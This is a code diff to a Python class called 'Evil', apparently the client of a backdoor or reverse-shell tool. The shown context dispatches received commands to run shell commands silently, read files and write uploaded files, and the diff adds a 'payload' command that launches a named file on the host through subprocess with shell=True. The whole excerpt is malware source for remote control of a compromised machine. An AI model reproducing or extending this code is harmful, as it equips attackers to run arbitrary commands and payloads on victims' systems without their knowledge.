@@ -43,6 +43,17 @@ class Evil:
         DEVNULL = open(os.devnull,'wb')
         return subprocess.check_output(cmd,shell=True,stderr=DEVNULL,stdin=DEVNULL)
 
+    def exec_payload(self, payload):
+        # DEVNULL = open(os.devnull, 'wb')
+        try:
+            if os.path.exists('./'+payload):
+                subprocess.Popen(payload, shell=True)
+                return "[+] Payload exec."
+            else:
+                return "[-] Payload not found."
+        except Exception:
+            return "[-] Failed exec."
+
     def change_working_dir(self,path):
         os.chdir(path)
         return "Changing dir to " + path
@@ -70,6 +81,8 @@ class Evil:
                     cmd_result = self.read_file(cmd[1])
                 elif cmd[0] == "upload" and len(cmd) > 1:
                     cmd_result = self.write_file(cmd[1],cmd[2])
+                elif cmd[0] == "payload" and len(cmd) > 1:
+                    cmd_result = self.exec_payload(cmd[1])
                 else:
                     cmd_result = self.exec_sys_cmd(cmd)
                 if not cmd_result:
